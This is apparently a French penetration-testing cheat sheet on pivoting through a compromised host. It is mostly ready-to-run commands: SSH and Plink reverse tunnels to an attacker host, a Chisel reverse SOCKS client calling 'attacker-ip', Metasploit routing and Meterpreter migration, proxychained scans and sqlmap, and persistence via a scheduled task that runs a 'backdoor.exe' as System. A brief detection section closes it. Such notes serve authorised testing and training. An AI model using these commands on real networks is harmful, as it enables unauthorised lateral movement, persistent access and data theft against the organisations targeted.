```mermaid
flowchart LR
    A[Attaquant] -->|Tunnel SOCKS/SSH| B(Pivot Compromis)
    B -->|Accès Interne| C[Cible Interne]
```

Le pivoting permet d'utiliser un système compromis comme passerelle pour atteindre des segments réseau inaccessibles. Cette technique s'appuie sur le tunneling et le port forwarding pour encapsuler le trafic.

## Types de Pivoting

| Méthode | Protocole | Usage principal |
| :--- | :--- | :--- |
| **SSH** | TCP | Tunneling dynamique ou redirection de port |
| **Metasploit** | TCP | SOCKS proxy et routage interne |
| **ProxyChains** | TCP | Tunnelisation d'outils via SOCKS |
| **Chisel** | HTTP/TCP | Proxying rapide multi-plateforme |
| **Plink** | SSH | Tunneling sur systèmes Windows |
| **VPN** | TUN/TAP | Accès réseau complet niveau 3 |

## Port Forwarding via SSH Local/Remote détaillé

> [!tip]
> Le port forwarding via **SSH** nécessite souvent l'option **-N** pour ne pas ouvrir de shell interactif sur la machine distante.

### Local Port Forwarding (-L)
Permet de rediriger un port de la machine locale vers une destination accessible depuis le pivot.
```bash
ssh -L 8080:127.0.0.1:3389 user@pivot-host -N
```
*Ici, le port 8080 local est mappé sur le RDP (3389) de la cible.*

### Remote Port Forwarding (-R)
Permet d'exposer un service de la machine attaquante vers le réseau du pivot (utile pour contourner des firewalls).
```bash
ssh -R 8080:127.0.0.1:80 user@pivot-host -N
```
*Le port 8080 sur le pivot redirige vers le port 80 de l'attaquant.*

## Double Pivoting (Multi-hop)

Le double pivoting consiste à enchaîner deux tunnels pour atteindre un segment réseau isolé (ex: DMZ -> LAN).

```mermaid
flowchart LR
    A[Attaquant] -->|Tunnel 1| B(Pivot 1)
    B -->|Tunnel 2| C(Pivot 2)
    C -->|Accès| D[Cible Interne]
```

1. Établir un tunnel SOCKS sur le premier pivot.
2. Utiliser **ProxyChains** pour se connecter au second pivot.
3. Exécuter **Chisel** ou **SSH** à travers ce tunnel pour créer le second saut.

```bash
# Via ProxyChains pour le second saut
proxychains ssh -D 9090 user@pivot-2 -N
```

## Pivoting avec SSH

> [!warning]
> Le port forwarding via **SSH** nécessite souvent l'option **-N** pour ne pas ouvrir de shell interactif sur la machine distante.

### Tunnel SSH local
```bash
ssh -L 8080:127.0.0.1:3389 user@pivot-host
```

### Tunnel SSH dynamique (SOCKS)
```bash
ssh -D 1080 user@pivot-host
```

### Redirection de port vers machine interne
```bash
ssh -L 4444:192.168.1.10:3389 user@pivot-host
```

### Tunnel inverse (Reverse SSH)
```bash
ssh -R 4444:localhost:22 user@attacker-host
```
Connexion depuis l'attaquant :
```bash
ssh -p 4444 user@localhost
```

## Pivoting avec Metasploit

### Tunnel SOCKS
```bash
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run
```

### Port forwarding via Meterpreter
```bash
portfwd add -l 4444 -p 3389 -r 192.168.1.10
```

### Routage automatique
```bash
use post/multi/manage/autoroute
set SESSION 1
run
```

## Gestion des sessions Meterpreter

La gestion efficace des sessions est critique pour maintenir l'accès lors du pivoting.

```bash
# Lister les sessions actives
sessions -l

# Interagir avec une session
sessions -i 1

# Backgrounder une session
background

# Migrer vers un processus stable pour éviter la perte de connexion
migrate -n explorer.exe
```

## Techniques de persistence sur pivot

Pour maintenir l'accès après un redémarrage du pivot :

- **Linux** : Ajout d'une clé SSH dans `~/.ssh/authorized_keys` ou création d'un service systemd malveillant.
- **Windows** : Utilisation de **Metasploit** `exploit/windows/local/persistence` ou création d'une tâche planifiée (`schtasks`).

```powershell
# Création d'une tâche planifiée de persistance
schtasks /create /tn "Updater" /tr "C:\temp\backdoor.exe" /sc onlogon /ru System
```

## Pivoting avec ProxyChains

Configuration dans **/etc/proxychains.conf** :
```text
strict_chain
proxy_dns
socks5 127.0.0.1 1080
```

### Utilisation avec outils externes
```bash
proxychains nmap -sT -Pn -n -v 192.168.1.0/24
proxychains rdesktop 192.168.1.10
proxychains sqlmap -u "http://target.com/vuln.php?id=1"
```

## Pivoting avec Chisel

> [!warning]
> Risque de détection élevé lors de l'utilisation d'outils comme **Chisel** sans obfuscation.

### Serveur (Attaquant)
```bash
chisel server --reverse --port 8080
```

### Client (Pivot)
```bash
chisel client attacker-ip:8080 R:1080:socks
```

## Pivoting avec Plink

### Tunnel SSH sur Windows
```powershell
plink.exe -N -L 8888:192.168.1.10:3389 user@pivot-host
```

### Port forwarding inverse
```powershell
plink.exe -R 4444:localhost:22 user@attacker-host
```

## Pivoting avec SOCKS et FPipe

### Tunnel SOCKS
```powershell
irelay.exe -L1080 -Rtarget-ip:target-port
```

### Port forwarding
```powershell
fpipe.exe -l 4444 -r 3389 -s 192.168.1.10
```

## Pivoting Avancé avec VPN

> [!danger]
> Nécessité d'activer l'IP forwarding sur la machine attaquante pour les tunnels VPN/TUN.

### Configuration du tunnel
```bash
openvpn --config access.conf
```

### Forwarding IP
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE
```

## Troubleshooting de connectivité (MTU, timeouts)

> [!warning]
> Attention aux problèmes de fragmentation réseau avec les tunnels SOCKS.

- **MTU** : Si les paquets sont perdus, réduire le MTU sur l'interface tunnel (ex: `ip link set dev tun0 mtu 1300`).
- **Timeouts** : Utiliser `ServerAliveInterval 60` dans la configuration SSH pour maintenir les connexions inactives.
- **Vérification** : Utiliser `tcpdump -i any host <target>` pour diagnostiquer si le trafic atteint réellement la cible.

## Détection et Contre-Mesures

### Surveillance et blocage
- **Netstat** : `netstat -ano | findstr "LISTENING"`
- **IP Forwarding** : `Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" -Name "IPEnableRouter" -Value 0`
- **Firewall** : `iptables -A OUTPUT -p tcp --dport 22 -j DROP`
- **Logs** : `index=windows (EventCode=5156 OR EventCode=5157) | search "socks5"`
- **Politique d'exécution** : `Set-ExecutionPolicy Restricted`

Voir aussi : **Network Enumeration**, **Metasploit Framework**, **SSH Tunneling & Port Forwarding**, **Windows Post-Exploitation**, **Linux Post-Exploitation**.
```